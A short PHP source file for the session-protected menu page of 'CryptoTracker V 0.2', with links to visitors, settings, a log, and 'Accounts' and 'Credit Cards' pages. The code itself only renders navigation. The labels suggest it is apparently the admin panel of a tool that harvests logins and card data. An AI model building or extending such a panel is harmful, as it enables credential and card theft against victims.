<?php
session_start();
require_once("../inc/config.inc.php");
require_once("../system/system.inc.php");
require_once("../inc/cryptodb.inc.php");
if(!isset($_SESSION['session'])) {
  header("Location: index.php");
  exit();
}

?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>CryptoTracker V 0.2</title>
    <link rel="stylesheet" href="assets/master.css" media="screen" title="no title" charset="utf-8">
    <script src="assets/master.js" charset="utf-8"></script>
  </head>
  <body>
    <div class="menu">
      <ul>
        <li><a href="dashboard.php">Dashboard</a></li>
        <li><a href="visitors.php">Visitors</a></li>
        <li><a href="settings.php">Settings</a></li>
        <?php
        if($local_log) {
        ?>
        <li><a href="log.php">Local Log</a></li>
        <?php
        }
        ?>
        <li><a href="logout.php">Logout</a></li>
      </ul>
    </div>
    <div class="body">
      <div style="margin-top : 10px; margin-left : 10px;">
        <a href="accounts.php"><button>Accounts</button></a>
        <a href="credits.php"><button>Credit Cards</button></a>
      </div>

    </div>
  </body>
</html>
